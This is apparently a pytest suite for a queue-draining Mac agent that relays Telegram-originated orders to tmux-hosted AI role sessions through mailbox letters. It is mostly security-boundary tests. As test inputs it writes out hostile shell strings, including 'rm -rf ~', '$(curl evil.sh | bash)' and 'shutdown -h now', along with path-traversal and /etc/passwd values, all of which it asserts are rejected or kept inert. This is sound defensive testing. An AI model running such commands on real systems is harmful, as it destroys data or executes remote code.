"""Tests for runners/mac_agent.py (task-776fbf7e; relay delivery reworked
task-02d0e863).

Everything is stubbed: no real ssh, no real tmux, no real spawn, no queue file.

The agent drains a queue written by a bot that reads Telegram, so most of these
are security-boundary tests rather than happy-path coverage. The Telegram
allowlist is the first wall; this file pins the second one.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import runners.mac_agent as ma  # noqa: E402
import tools.send_to_cxo as sc  # noqa: E402
from lib import mailbox  # noqa: E402

PREFIX = ma.RELAY_PREFIX


class FakeRun:
    """Records every subprocess.run argv, so a test can assert what ran — and,
    crucially, that queue content never became a shell string."""

    def __init__(self, returncode=0, stdout="", stderr=""):
        self.calls: list[list[str]] = []
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr

    def __call__(self, argv, *a, **kw):
        self.calls.append(list(argv))
        return subprocess.CompletedProcess(
            argv, self.returncode, self.stdout, self.stderr)


@pytest.fixture
def relay_env(tmp_path, monkeypatch):
    """Isolate everything do_relay touches: the mailbox root
    (lib.mailbox.INBOX_ROOT) and the directory the <role>-active pointer is
    read from (send_to_cxo.LOCKS_DIR — _active_session_id resolves against
    send_to_cxo's OWN global, same value as production's ROOT-derived one).
    Without this a relay test would read this checkout's real state/locks/
    and write its real state/inbox/."""
    monkeypatch.setattr(mailbox, "INBOX_ROOT", tmp_path / "inbox")
    monkeypatch.setattr(sc, "LOCKS_DIR", tmp_path / "locks")
    (tmp_path / "locks").mkdir()
    return tmp_path


def _point_at(monkeypatch, tmp_path, role: str, sid: str) -> None:
    """Make <role>-active name <sid>: the primary-session pointer."""
    ((tmp_path / "locks") / f"{role}-active").write_text(sid)


def _letters(tmp_path) -> list[Path]:
    inbox = tmp_path / "inbox"
    if not inbox.is_dir():
        return []
    return sorted(inbox.rglob("*.json"))


# ---------------------------------------------------------------------------
# dispatch
# ---------------------------------------------------------------------------

def test_relay_delivers_a_letter_not_keystrokes(relay_env, monkeypatch):
    """task-02d0e863 D1: delivery IS a letter on disk in the recipient's
    mailbox — prefixed body, secretary `from`, letter path in the result.
    The old typed-keystroke transport (tmux send-keys, whose Enter GH #70
    can swallow) must never be reached: any send-keys here is a failure."""
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    wakes = []
    monkeypatch.setattr(ma, "attempt_wake", lambda *a: wakes.append(a))

    message = f"{PREFIX} ตรวจงานให้หน่อย"
    ok, detail = ma.do_relay("cto", {"message": message})

    assert ok, detail
    for argv in fake.calls:
        assert argv[1:2] != ["send-keys"], "delivery must not type anything"

    delivered = _letters(relay_env)
    assert len(delivered) == 1, "delivered means exactly one letter on disk"
    assert delivered[0].parent.name == "cto-abc123"
    letter = json.loads(delivered[0].read_text(encoding="utf-8"))
    assert letter["body"] == message
    assert letter["from"] == {"role": "secretary", "session_id": "sompong"}
    assert letter["to"] == {"role": "cto", "session_id": "abc123"}
    # The queue entry's result carries the letter path.
    assert str(delivered[0]) in detail
    # Wake got the secretary's own label, never a C-level name.
    assert wakes == [("cto", "abc123", "SomPong")]


def test_relay_addresses_the_pointer_session_not_the_first_match(relay_env, monkeypatch):
    """task-02d0e863 D1a: four live cto-* sessions, the pointer names the
    THIRD. The letter must be addressed to the pointer's session. A revert
    to first-match would resolve cto-aaaaaa (tmux lists it first) and this
    test fails."""
    _point_at(monkeypatch, relay_env, "cto", "cccccc")
    fake = FakeRun(stdout="cto-aaaaaa\ncto-bbbbbb\ncto-cccccc\ncto-dddddd\n")
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "attempt_wake", lambda *a: None)

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} ไปที่ primary เท่านั้น"})

    assert ok, detail
    delivered = _letters(relay_env)
    assert len(delivered) == 1
    assert delivered[0].parent.name == "cto-cccccc", \
        "the letter follows the pointer, not tmux's listing order"
    assert not (relay_env / "inbox" / "cto-aaaaaa").exists(), \
        "first-match must never receive a CEO order"
    letter = json.loads(delivered[0].read_text(encoding="utf-8"))
    assert letter["to"] == {"role": "cto", "session_id": "cccccc"}


def test_relay_fails_when_pointer_and_tmux_disagree(relay_env, monkeypatch):
    """Other cto-* sessions are live but the one the pointer names is not:
    fail the entry with a reason instead of guessing which session the CEO
    meant. No letter may be written on a guess."""
    _point_at(monkeypatch, relay_env, "cto", "deadbee")

    def run(argv, *a, **kw):
        argv = [str(c) for c in argv]
        if argv[1:3] == ["has-session", "-t"]:
            code = 1 if argv[3] == "cto-deadbee" else 0
            return subprocess.CompletedProcess(argv, code, "", "")
        return subprocess.CompletedProcess(argv, 0, "cto-aaaaaa\n", "")

    monkeypatch.setattr(ma.subprocess, "run", run)
    monkeypatch.setattr(ma, "attempt_wake", lambda *a: None)

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} hi"})

    assert not ok
    assert "disagree" in detail
    assert _letters(relay_env) == []


def test_relay_fails_when_the_pointer_moves_mid_relay(relay_env, monkeypatch):
    """Race cross-check, same as Contabo: the pointer read twice must agree.
    If it moved between the reads, neither id is trustworthy — fail."""
    reads = iter(["cccccc", "dddddddd"])
    monkeypatch.setattr(ma, "_active_session_id", lambda role: next(reads))
    monkeypatch.setattr(ma, "_live_session", lambda name: True)
    monkeypatch.setattr(ma, "attempt_wake", lambda *a: None)

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} hi"})

    assert not ok
    assert "moved mid-relay" in detail
    assert _letters(relay_env) == []


def test_relay_fails_when_no_active_pointer_exists(relay_env, monkeypatch):
    monkeypatch.setattr(ma, "attempt_wake", lambda *a: None)

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} hi"})

    assert not ok
    assert "no active" in detail
    assert _letters(relay_env) == []


def test_relay_delivered_even_when_wake_raises(relay_env, monkeypatch):
    """THE pin of the migration: a wake failure must not cost the delivery.
    The letter is what delivery means; the wake is an attention nudge on
    top of an already-durable write."""
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    monkeypatch.setattr(ma.subprocess, "run", FakeRun())

    def boom(*a, **kw):
        raise RuntimeError("tmux exploded mid-wake")

    monkeypatch.setattr(ma, "attempt_wake", boom)

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} do the thing"})

    assert ok, detail
    assert len(_letters(relay_env)) == 1, "the letter must survive the wake"


def test_relay_failed_mailbox_write_never_reports_delivered(relay_env, monkeypatch):
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    monkeypatch.setattr(ma.subprocess, "run", FakeRun())

    def boom(*a, **kw):
        raise OSError("disk full")

    monkeypatch.setattr(ma.mailbox, "send", boom)

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} do the thing"})

    assert not ok
    assert "mailbox write failed" in detail and "disk full" in detail
    assert _letters(relay_env) == []


def test_relay_letter_missing_after_write_is_failure_not_success(relay_env, monkeypatch):
    """mailbox.send returning a path that is not on disk is the
    act-without-effect shape — report the effect (failure), never the act."""
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    monkeypatch.setattr(ma.subprocess, "run", FakeRun())
    ghost = relay_env / "inbox" / "ghost.json"

    monkeypatch.setattr(ma.mailbox, "send", lambda *a, **kw: ghost)

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} do the thing"})

    assert not ok
    assert str(ghost) in detail
    assert _letters(relay_env) == []


def test_relay_no_keystroke_carries_the_body(relay_env, monkeypatch):
    """Every subprocess argv during a relay is captured — including the
    wake's own typing. The body must appear in none of them: it travels by
    file. Only the short content-free wake marker may be typed, and only
    into the pointer's session."""
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    argvs = []

    def run(argv, **kw):
        argv = [str(c) for c in argv]
        argvs.append(argv)
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(ma.subprocess, "run", run)
    monkeypatch.setattr(ma.time, "sleep", lambda s: None)

    body = "SECRET-BODY-must-never-be-typed-into-any-composer"
    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} {body}"})

    assert ok, detail
    typed = [a for a in argvs if a[1:2] == ["send-keys"]]
    assert typed, "the wake marker should have been typed (best-effort path)"
    for argv in argvs:
        joined = " ".join(argv)
        assert body not in joined, "the body must never be typed anywhere"
    for argv in typed:
        assert argv[2:4] == ["-t", "cto-abc123"], \
            "only the pointer's session may be typed into"
    markers = [a[-1] for a in typed if "-l" in a]
    assert markers == ["[New message from SomPong]"], \
        "the only typed text is the content-free wake marker"


# ---------------------------------------------------------------------------
# do_relay -- explicit target_session_id (task-689fc721 D2)
#
# Contabo's relay_to_session carries an explicit target_session_id through
# the queue payload; do_relay must honour it exactly, with the identical
# no-fallback rule as the Contabo side: never redirect to <role>-active.
# ---------------------------------------------------------------------------

def test_relay_explicit_target_session_id_delivers_to_named_session_not_pointer(
        relay_env, monkeypatch):
    """Four live cto-* sessions, the pointer names one, an explicit
    target_session_id in the payload names a DIFFERENT one -- the letter
    must follow the explicit id, never the pointer, and never through
    _resolve_pointer_session at all."""
    _point_at(monkeypatch, relay_env, "cto", "aaaaaa")
    fake = FakeRun(stdout="cto-aaaaaa\ncto-bbbbbb\ncto-cccccc\ncto-dddddd\n")
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "attempt_wake", lambda *a: None)

    ok, detail = ma.do_relay("cto", {
        "message": f"{PREFIX} ไปที่ session ที่ระบุเท่านั้น",
        "target_session_id": "cccccc",
    })

    assert ok, detail
    delivered = _letters(relay_env)
    assert len(delivered) == 1
    assert delivered[0].parent.name == "cto-cccccc"
    assert not (relay_env / "inbox" / "cto-aaaaaa").exists(), \
        "the pointer's box must never receive this order"
    letter = json.loads(delivered[0].read_text(encoding="utf-8"))
    assert letter["to"] == {"role": "cto", "session_id": "cccccc"}


def test_relay_explicit_target_session_id_not_live_is_refused_with_live_ids(
        relay_env, monkeypatch):
    """A target_session_id that names no live session on this Mac is
    refused -- never redirected to the pointer's session -- and the
    refusal names the live ids that DO exist, so the caller can pick a
    real one instead of guessing again."""
    def run(argv, *a, **kw):
        argv = [str(c) for c in argv]
        if argv[1:3] == ["has-session", "-t"]:
            return subprocess.CompletedProcess(argv, 1, "", "")  # never live
        return subprocess.CompletedProcess(argv, 0, "cto-aaaaaa\ncto-bbbbbb\n", "")

    monkeypatch.setattr(ma.subprocess, "run", run)

    ok, detail = ma.do_relay("cto", {
        "message": f"{PREFIX} hi",
        "target_session_id": "dddddd",
    })

    assert not ok
    assert "dddddd" in detail
    assert "aaaaaa" in detail and "bbbbbb" in detail
    assert _letters(relay_env) == []


def test_relay_explicit_target_session_id_malformed_is_rejected(relay_env, monkeypatch):
    """Hex, 6-64 characters, nothing else -- rejected before any tmux call
    is even made, never sanitised."""
    def run(argv, *a, **kw):
        raise AssertionError(f"malformed id must be rejected before any tmux call: {argv!r}")

    monkeypatch.setattr(ma.subprocess, "run", run)

    ok, detail = ma.do_relay("cto", {
        "message": f"{PREFIX} hi",
        "target_session_id": "../../etc",
    })

    assert not ok
    assert "malformed" in detail
    assert _letters(relay_env) == []


def test_relay_target_session_id_must_be_a_string():
    ok, detail = ma.do_relay("cto", {
        "message": f"{PREFIX} hi", "target_session_id": 123,
    })
    assert not ok
    assert "string" in detail


def test_spawn_entry_invokes_the_right_script_for_the_role(monkeypatch, tmp_path):
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "ROOT", tmp_path)
    scripts = tmp_path / "scripts"
    scripts.mkdir()
    (scripts / "spawn-cto.sh").write_text("#!/bin/bash\n")
    (scripts / "spawn-cxo.sh").write_text("#!/bin/bash\n")

    ok, _ = ma.do_spawn("cto", {})
    assert ok
    assert fake.calls[-1][0].endswith("spawn-cto.sh")

    ok, _ = ma.do_spawn("cfo", {})
    assert ok
    assert fake.calls[-1][0].endswith("spawn-cxo.sh")
    assert fake.calls[-1][1:] == ["--role", "cfo"]


# ---------------------------------------------------------------------------
# security boundary
# ---------------------------------------------------------------------------

def test_security_unknown_kind_is_refused_and_nothing_executes(monkeypatch):
    """An enumerated action list stops being one the moment an unrecognised
    entry gets executed anyway. Unknown kind must fail, never fall back."""
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)

    ok, detail = ma.process(
        {"id": 1, "kind": "exec", "target_role": "cto",
         "payload": {"cmd": "rm -rf ~"}})

    assert not ok
    assert "unknown kind" in detail
    assert fake.calls == [], "nothing may run for an unrecognised kind"


@pytest.mark.parametrize("hostile", [
    "; rm -rf ~",
    "$(curl evil.sh | bash)",
    "`whoami`",
    "&& shutdown -h now",
])
def test_security_shell_metacharacters_are_inert_arguments(relay_env, monkeypatch, hostile):
    """Queue content must never be interpreted. The body lands in a JSON
    letter as data; the only subprocess argvs are fixed tmux liveness
    checks carrying a session name — no shell string is ever built."""
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "attempt_wake", lambda *a: None)

    message = f"{PREFIX} {hostile}"
    ok, _ = ma.do_relay("cto", {"message": message})

    assert ok
    delivered = _letters(relay_env)
    assert len(delivered) == 1
    letter = json.loads(delivered[0].read_text(encoding="utf-8"))
    assert letter["body"] == message, "the body must arrive intact, as data"
    for argv in fake.calls:
        assert hostile not in " ".join(argv), \
            "queue content must never appear in a subprocess argv"


def test_security_relay_without_attribution_is_refused(monkeypatch):
    """The [CEO via SomPong] marker is the only thing distinguishing a
    bot-originated order from one the CEO typed. Refuse, never repair."""
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)

    ok, detail = ma.do_relay("cto", {"message": "merge everything to main"})

    assert not ok
    assert "attribution" in detail
    assert fake.calls == [], "an unattributed order must not reach tmux"


def test_read_returns_the_pane_tail_and_never_types_anything(monkeypatch):
    """`read` is read-only. It must capture and return, never send-keys —
    otherwise a "show me the screen" request could act on the session."""
    fake = FakeRun(stdout="line1\nline2\nline3\n\n\n")
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    ok, out = ma.do_read("cto", {"lines": 2})

    assert ok
    assert "line2" in out and "line3" in out
    assert "line1" not in out, "should return only the requested tail"
    assert out.startswith("[cto-abc123]"), "must say which session it came from"
    argv = fake.calls[-1]
    assert Path(argv[0]).name == "tmux"
    assert argv[1] == "capture-pane"
    assert "send-keys" not in argv, "read must never type into the session"


def test_read_caps_the_line_count(monkeypatch):
    """An uncapped read is both a cost problem and a way to pull a lot at
    once."""
    fake = FakeRun(stdout="\n".join(f"l{i}" for i in range(5000)))
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    ok, out = ma.do_read("cto", {"lines": 99999})

    assert ok
    assert len(out.splitlines()) <= ma.MAX_READ_LINES


def test_read_rejects_bad_input(monkeypatch):
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")
    ok, detail = ma.do_read("root", {"lines": 10})
    assert not ok and "unknown role" in detail

    ok, detail = ma.do_read("cto", {"lines": "; rm -rf ~"})
    assert not ok and "positive integer" in detail


def test_security_unknown_role_is_refused_for_both_kinds():
    ok, detail = ma.do_relay("root", {"message": f"{PREFIX} hi"})
    assert not ok and "unknown role" in detail

    ok, detail = ma.do_spawn("../../etc", {})
    assert not ok and "unknown role" in detail


# ---------------------------------------------------------------------------
# robustness
# ---------------------------------------------------------------------------

def test_one_failing_entry_does_not_block_the_rest(monkeypatch):
    marked: list[tuple[int, str]] = []
    monkeypatch.setattr(ma, "fetch_pending", lambda: [
        {"id": 1, "kind": "nope", "target_role": "cto", "payload": {}},
        {"id": 2, "kind": "relay", "target_role": "cto",
         "payload": {"message": f"{PREFIX} ok"}},
    ])
    monkeypatch.setattr(ma, "mark",
                        lambda i, s, r: marked.append((i, s)) or True)
    monkeypatch.setitem(ma.HANDLERS, "relay", lambda role, p: (True, "delivered"))

    assert ma.tick() == 2
    assert marked == [(1, "failed"), (2, "done")]


def test_a_raising_handler_is_caught_and_reported(monkeypatch):
    marked: list[tuple[int, str, str]] = []

    def boom(role, payload):
        raise RuntimeError("kaboom")

    monkeypatch.setattr(ma, "fetch_pending", lambda: [
        {"id": 7, "kind": "relay", "target_role": "cto", "payload": {}}])
    monkeypatch.setattr(ma, "mark",
                        lambda i, s, r: marked.append((i, s, r)) or True)
    monkeypatch.setitem(ma.HANDLERS, "relay", boom)

    ma.tick()
    assert marked[0][1] == "failed"
    assert "kaboom" in marked[0][2]


def test_transport_failure_leaves_entries_pending(monkeypatch):
    """A dead VPS must not silently consume work. fetch returns nothing, so
    nothing is marked — the entries are still there on the next tick."""
    monkeypatch.setattr(ma, "_ssh_sqlite", lambda sql: (False, "ssh failed"))
    marked = []
    monkeypatch.setattr(ma, "mark", lambda *a: marked.append(a) or True)

    assert ma.fetch_pending() == []
    assert ma.tick() == 0
    assert marked == [], "nothing may be closed when the queue is unreachable"


def test_malformed_queue_rows_are_skipped_not_fatal(monkeypatch):
    monkeypatch.setattr(ma, "_ssh_sqlite", lambda sql: (True, "\n".join([
        '1|relay|cto|{"message": "hi"}',
        "garbage-line",
        "2|spawn|cfo|not-json",
    ])))
    rows = ma.fetch_pending()
    assert [r["id"] for r in rows] == [1]


# ---------------------------------------------------------------------------
# terminals / history (task-05ae76f3) — read-only org inspection
# ---------------------------------------------------------------------------

def _fake_row(i: int) -> dict:
    return {
        "host": "mac", "role": "cto", "id": f"{i:06x}", "tmux_name": None,
        "live": i == 0, "attached": False, "glyph": "✅", "state": "pending",
        "summary": f"งานตัวอย่าง {i}", "goal": None, "done": None, "total": None,
        "percent": None, "blocker": None, "created": None,
        "last_active": 1755100000.0 - i, "idle_seconds": 0,
    }


def _inspect_stub(monkeypatch, rows):
    monkeypatch.setattr(ma, "list_sessions", lambda include_closed: list(rows))
    monkeypatch.setattr(ma, "detect_host", lambda: "mac")


def test_terminals_caps_rows_and_says_when_dropped(monkeypatch):
    _inspect_stub(monkeypatch, [_fake_row(i) for i in range(60)])

    ok, result = ma.do_terminals("", {"include_closed": False})

    assert ok
    out = json.loads(result)
    assert out["host"] == "mac"
    assert out["total_sessions"] == 60
    assert len(out["sessions"]) == 50 == ma.MAX_TERMINAL_ROWS
    assert out["dropped"] == 10
    assert "10" in out["note"], "dropped rows must be said out loud"


def test_terminals_no_note_when_nothing_dropped(monkeypatch):
    _inspect_stub(monkeypatch, [_fake_row(i) for i in range(3)])

    ok, result = ma.do_terminals("", {})

    assert ok
    out = json.loads(result)
    assert out["dropped"] == 0
    assert "note" not in out


def test_terminals_passes_include_closed_through_and_validates_it(monkeypatch):
    seen = {}

    def recorder(include_closed):
        seen["ic"] = include_closed
        return []

    monkeypatch.setattr(ma, "list_sessions", recorder)
    monkeypatch.setattr(ma, "detect_host", lambda: "mac")

    ma.do_terminals("", {"include_closed": True})
    assert seen["ic"] is True

    ma.do_terminals("", {})
    assert seen["ic"] is False, "default must be False (what is happening NOW)"

    ok, detail = ma.do_terminals("", {"include_closed": "yes please"})
    assert not ok and "boolean" in detail


def test_terminals_payload_survives_the_result_column(monkeypatch):
    """mark() used to cut `result` at 500 chars, which would have silently
    destroyed every terminals payload (a 50-row snapshot is ~12 KB). Pin the
    fix: the full JSON fits MAX_RESULT_CHARS and lands in the UPDATE."""
    _inspect_stub(monkeypatch, [_fake_row(i) for i in range(50)])

    ok, result = ma.do_terminals("", {})
    assert ok
    assert len(result) > 500, "a real snapshot must be far bigger than the old cap"
    assert json.loads(result)["returned"] == 50, "payload must still be valid JSON"

    sqls = []

    def fake_ssh(sql):
        sqls.append(sql)
        return True, ""

    monkeypatch.setattr(ma, "_ssh_sqlite", fake_ssh)
    assert ma.mark(1, "done", result)
    assert result in sqls[0], "the whole payload must reach the queue row"


def test_mark_still_bounds_a_hostile_giant_result(monkeypatch):
    sqls = []

    def fake_ssh(sql):
        sqls.append(sql)
        return True, ""

    monkeypatch.setattr(ma, "_ssh_sqlite", fake_ssh)
    ma.mark(2, "done", "x" * 100_000)
    assert len(sqls[0]) <= len("x" * ma.MAX_RESULT_CHARS) + 200, \
        "the cap is a bound, not a suggestion"


def test_terminals_entry_flows_through_process(monkeypatch):
    _inspect_stub(monkeypatch, [_fake_row(0)])
    ok, result = ma.process(
        {"id": 1, "kind": "terminals", "target_role": "", "payload": {}})
    assert ok
    assert json.loads(result)["returned"] == 1


def test_history_index_mode_returns_json(monkeypatch):
    monkeypatch.setattr(ma, "history_index",
                        lambda sid: {"host": "mac", "session_id": sid, "counts": {}})

    ok, result = ma.do_history("", {"mode": "index", "session_id": "624111c5"})

    assert ok
    out = json.loads(result)
    assert out["session_id"] == "624111c5"

    ok, result = ma.do_history("", {"mode": "index"})
    assert ok and json.loads(result)["session_id"] is None


def test_history_read_mode_happy_path(monkeypatch):
    monkeypatch.setattr(
        ma, "history_read",
        lambda p, tail_lines: {"status": "ok", "path": p, "text": "tail"})

    ok, result = ma.do_history("", {"mode": "read", "path": "/somewhere/x.log",
                                    "tail_lines": 5})
    assert ok
    out = json.loads(result)
    assert out["status"] == "ok" and out["path"] == "/somewhere/x.log"


def test_history_read_rejection_fails_the_entry(monkeypatch):
    """A refusal is the security boundary doing its job — the queue entry must
    read as failed, never as success-with-a-body."""
    monkeypatch.setattr(
        ma, "history_read",
        lambda p, tail_lines: {"status": "rejected",
                               "reason": "outside ALLOWED_HISTORY_ROOTS"})

    ok, detail = ma.do_history("", {"mode": "read", "path": "/etc/passwd",
                                    "tail_lines": 5})
    assert not ok
    assert "rejected" in detail and "ALLOWED_HISTORY_ROOTS" in detail


def test_history_unknown_mode_fails_and_executes_nothing(monkeypatch):
    calls = []
    monkeypatch.setattr(ma, "history_index",
                        lambda sid: calls.append(("index", sid)) or {})
    monkeypatch.setattr(ma, "history_read",
                        lambda p, tail_lines: calls.append(("read", p)) or {})

    ok, detail = ma.do_history("", {"mode": "delete", "path": "/etc/passwd"})

    assert not ok
    assert "unknown mode" in detail
    assert calls == [], "an unknown mode must dispatch nowhere"


def test_history_validates_payload_shapes(monkeypatch):
    monkeypatch.setattr(ma, "history_index", lambda sid: {"counts": {}})
    monkeypatch.setattr(ma, "history_read",
                        lambda p, tail_lines: {"status": "ok"})

    ok, d = ma.do_history("", {"mode": "read", "tail_lines": 5})
    assert not ok and "path" in d

    ok, d = ma.do_history("", {"mode": "read", "path": "x.log", "tail_lines": 0})
    assert not ok and "positive integer" in d

    ok, d = ma.do_history("", {"mode": "read", "path": "x.log", "tail_lines": True})
    assert not ok and "positive integer" in d

    ok, d = ma.do_history("", {"mode": "index", "session_id": 42})
    assert not ok and "string" in d


def test_terminals_and_history_are_registered_kinds():
    assert ma.HANDLERS["terminals"] is ma.do_terminals
    assert ma.HANDLERS["history"] is ma.do_history
    assert ma.HANDLERS["terminal_open"] is ma.do_terminal_open
    assert set(ma.HANDLERS) == {
        "relay", "spawn", "read", "terminals", "history", "terminal_open"}


# ---------------------------------------------------------------------------
# terminal_open (task-2a135187 D3) -- /terminal-open, reattach an iTerm
# window to an already-running session. Mac-only, spawns nothing.
# ---------------------------------------------------------------------------

def _stub_terminal_open_script(monkeypatch, tmp_path) -> None:
    monkeypatch.setattr(ma, "ROOT", tmp_path)
    scripts = tmp_path / "scripts"
    scripts.mkdir(exist_ok=True)
    (scripts / "terminal-open.sh").write_text("#!/bin/bash\n")


def test_terminal_open_no_session_id_resolves_the_active_pointer(
        relay_env, monkeypatch, tmp_path):
    """D5: open_terminal with no session_id resolves the <role>-active
    pointer, the same primary-session resolution do_relay uses."""
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    _stub_terminal_open_script(monkeypatch, tmp_path)
    fake = FakeRun()  # returncode 0 for every call: liveness AND the script
    monkeypatch.setattr(ma.subprocess, "run", fake)

    ok, detail = ma.do_terminal_open("cto", {})

    assert ok, detail
    assert "cto-abc123" in detail
    script_calls = [c for c in fake.calls if c[0] == "bash"]
    assert script_calls, "expected terminal-open.sh to be invoked"
    assert script_calls[-1][1].endswith("terminal-open.sh")
    assert script_calls[-1][2] == "cto-abc123"


def test_terminal_open_refuses_when_pointer_and_tmux_disagree(
        relay_env, monkeypatch, tmp_path):
    """Same race guard do_relay uses -- a stale pointer must never be
    guessed at, not even for a read-ish action like opening a window."""
    _point_at(monkeypatch, relay_env, "cto", "deadbee")

    def run(argv, *a, **kw):
        argv = [str(c) for c in argv]
        if argv[1:3] == ["has-session", "-t"]:
            return subprocess.CompletedProcess(argv, 1, "", "")
        raise AssertionError(
            f"terminal-open.sh must not run on a disagreeing pointer: {argv!r}")

    monkeypatch.setattr(ma.subprocess, "run", run)

    ok, detail = ma.do_terminal_open("cto", {})

    assert not ok
    assert "disagree" in detail


def test_terminal_open_explicit_session_id_is_checked_directly(
        relay_env, monkeypatch, tmp_path):
    """An explicit session_id is targeted as given -- no pointer lookup, no
    redirect to whatever <role>-active currently names."""
    _stub_terminal_open_script(monkeypatch, tmp_path)
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "_live_session", lambda name: name == "cmo-xyz789")

    ok, detail = ma.do_terminal_open("cmo", {"session_id": "xyz789"})

    assert ok, detail
    assert "cmo-xyz789" in detail
    script_calls = [c for c in fake.calls if c[0] == "bash"]
    assert script_calls[-1][2] == "cmo-xyz789"


def test_terminal_open_explicit_session_id_not_live_is_refused(monkeypatch):
    monkeypatch.setattr(ma, "_live_session", lambda name: False)
    ok, detail = ma.do_terminal_open("cmo", {"session_id": "ghost99"})
    assert not ok
    assert "no live tmux session" in detail


def test_terminal_open_rejects_unknown_role():
    ok, detail = ma.do_terminal_open("root", {})
    assert not ok and "unknown role" in detail


def test_terminal_open_rejects_non_string_session_id():
    ok, detail = ma.do_terminal_open("cto", {"session_id": 123})
    assert not ok and "string" in detail


def test_terminal_open_missing_script_fails_cleanly(relay_env, monkeypatch, tmp_path):
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    monkeypatch.setattr(ma, "ROOT", tmp_path)  # scripts/terminal-open.sh absent
    monkeypatch.setattr(ma, "_live_session", lambda name: True)

    ok, detail = ma.do_terminal_open("cto", {})

    assert not ok
    assert "missing" in detail and "terminal-open.sh" in detail


def test_terminal_open_nonzero_exit_is_reported_not_swallowed(
        relay_env, monkeypatch, tmp_path):
    """The script call's own failure must surface distinctly from the
    liveness check that ran just before it."""
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    _stub_terminal_open_script(monkeypatch, tmp_path)

    def run(argv, *a, **kw):
        argv = [str(c) for c in argv]
        if argv[0] == "bash":
            return subprocess.CompletedProcess(argv, 2, "", "no such tmux session")
        return subprocess.CompletedProcess(argv, 0, "", "")  # liveness check: live

    monkeypatch.setattr(ma.subprocess, "run", run)

    ok, detail = ma.do_terminal_open("cto", {})

    assert not ok
    assert "exit 2" in detail
    assert "no such tmux session" in detail


def test_terminal_open_entry_flows_through_process(relay_env, monkeypatch, tmp_path):
    _point_at(monkeypatch, relay_env, "cto", "abc123")
    _stub_terminal_open_script(monkeypatch, tmp_path)
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)

    ok, result = ma.process(
        {"id": 1, "kind": "terminal_open", "target_role": "cto", "payload": {}})

    assert ok
    assert "cto-abc123" in result
